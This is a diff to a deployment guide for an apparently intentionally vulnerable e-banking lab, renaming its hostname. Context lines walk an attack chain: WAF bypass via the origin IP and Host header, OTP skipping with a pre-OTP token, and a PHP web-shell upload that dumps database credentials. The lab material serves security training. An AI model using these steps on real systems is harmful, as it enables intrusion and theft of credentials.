@@ -19,7 +19,7 @@ This is an end-to-end, do-this-then-that guide. Follow the parts in order.
               ┌───────────────────┐        (separate WAF01 appliance
               │   WAF / CDN edge   │◄──────  filters uploads on the public route)
               └───────────────────┘
-                        │  online.senarathbank.com
+                        │  ebanking.senarathbank.com
                         ▼
   ┌──────────────────────────────────────────────────────────┐
   │  WEB01  —  Ubuntu Server 24.04  +  Docker + Docker Compose │
@@ -28,7 +28,7 @@ This is an end-to-end, do-this-then-that guide. Follow the parts in order.
   │   │ nginx gateway│  (routes by hostname)                   │
   │   └──────┬───────┘                                         │
   │          ├──────────────► corporate  (www.senarathbank.com)│
-  │          └──────────────► ebanking   (online.senarathbank.com)
+  │          └──────────────► ebanking   (ebanking.senarathbank.com)
   │                                   │  TCP 1433              │
   └───────────────────────────────────┼────────────────────────┘
                                        ▼
@@ -52,7 +52,7 @@ This is an end-to-end, do-this-then-that guide. Follow the parts in order.
 |------|------|-----------|
 | WEB01 | Ubuntu web origin (DMZ) | `10.10.10.10` |
 | SQL01 | MSSQL (internal) | `10.10.20.11` |
-| Public name | `online.senarathbank.com` / `www.senarathbank.com` | → WAF → WEB01 |
+| Public name | `ebanking.senarathbank.com` / `www.senarathbank.com` | → WAF → WEB01 |
 
 ---
 
@@ -240,7 +240,7 @@ You should see three containers: `senarath-corporate`, `senarath-ebanking`,
 Quick local checks on WEB01:
 ```bash
 curl -s -o /dev/null -w "corporate %{http_code}\n" -H 'Host: www.senarathbank.com'    http://127.0.0.1/
-curl -s -o /dev/null -w "ebanking  %{http_code}\n" -H 'Host: online.senarathbank.com' http://127.0.0.1/index.php
+curl -s -o /dev/null -w "ebanking  %{http_code}\n" -H 'Host: ebanking.senarathbank.com' http://127.0.0.1/index.php
 ```
 Both should return `200`.
 
@@ -250,7 +250,7 @@ Both should return `200`.
 
 ### 7.1 For the public demo
 Point the public DNS (or the WAF/CDN origin config) so that:
-- `www.senarathbank.com` and `online.senarathbank.com` resolve to the **WAF**, which
+- `www.senarathbank.com` and `ebanking.senarathbank.com` resolve to the **WAF**, which
   forwards to **WEB01** as its origin.
 - The nginx gateway on WEB01 routes by `Host` header to the right container.
 
@@ -258,17 +258,17 @@ Point the public DNS (or the WAF/CDN origin config) so that:
 On any client machine, add hosts entries pointing the names at WEB01 (or the WAF):
 ```
 10.10.10.10   www.senarathbank.com
-10.10.10.10   online.senarathbank.com
+10.10.10.10   ebanking.senarathbank.com
 ```
 
 ### 7.3 The V2 origin exposure
 Weakness **V2** requires the **origin IP** (WEB01) to answer for
-`online.senarathbank.com` from any lab source — bypassing the WAF. The nginx gateway
+`ebanking.senarathbank.com` from any lab source — bypassing the WAF. The nginx gateway
 already does this (routes purely on `Host`, no source-IP check, no upload filtering).
 Make the origin IP *discoverable* per the build guide (leaked/historical A record, a
 dev subdomain, or MX/SPF). Validate:
 ```bash
-curl -k https://<WEB01_IP>/ -H 'Host: online.senarathbank.com'   # returns the app, WAF out of path
+curl -k https://<WEB01_IP>/ -H 'Host: ebanking.senarathbank.com'   # returns the app, WAF out of path
 ```
 
 ---
@@ -280,7 +280,7 @@ The gateway ships listening on port 80. For a public event, add HTTPS:
 **Option A — certbot on the host**, then mount certs into the gateway:
 ```bash
 sudo apt-get install -y certbot
-sudo certbot certonly --standalone -d online.senarathbank.com -d www.senarathbank.com
+sudo certbot certonly --standalone -d ebanking.senarathbank.com -d www.senarathbank.com
 # certs land in /etc/letsencrypt/live/<domain>/
 ```
 Then, in `senarath-ebanking/docker-compose.yml`, mount them and publish 443:
@@ -313,7 +313,7 @@ With the stack up and the DB seeded, confirm the attack chain is walkable. Full
 detail and acceptance tests are in **`VULNERABILITIES.md`**; the quick pass:
 
 ```bash
-BASE=https://online.senarathbank.com     # or http://<WEB01_IP> with -H 'Host: ...'
+BASE=https://ebanking.senarathbank.com     # or http://<WEB01_IP> with -H 'Host: ...'
 
 # V3 — leaked credential logs in and reaches OTP; capture the pre-OTP token (V4):
 TOKEN=$(curl -sk -X POST $BASE/api/login.php -H 'Content-Type: application/json' \
@@ -334,7 +334,7 @@ printf '%s' '<?php system("env | grep DB_"); ?>' > env.php
 curl -sk -X POST $BASE/upload.php -b "sb_session=$TOKEN" -F 'document=@env.php'
 curl -sk $BASE/uploads/env.php                 # → DB_USER=lab_app / DB_PASSWORD=DbLab123! / DB_HOST=...
 ```
-Browser walk: open `online.senarathbank.com`, log in as `customer01 / Welcome123!`,
+Browser walk: open `ebanking.senarathbank.com`, log in as `customer01 / Welcome123!`,
 then **navigate straight to `/dashboard.php`** (skipping OTP) — you are already in (V4).
 
 ---
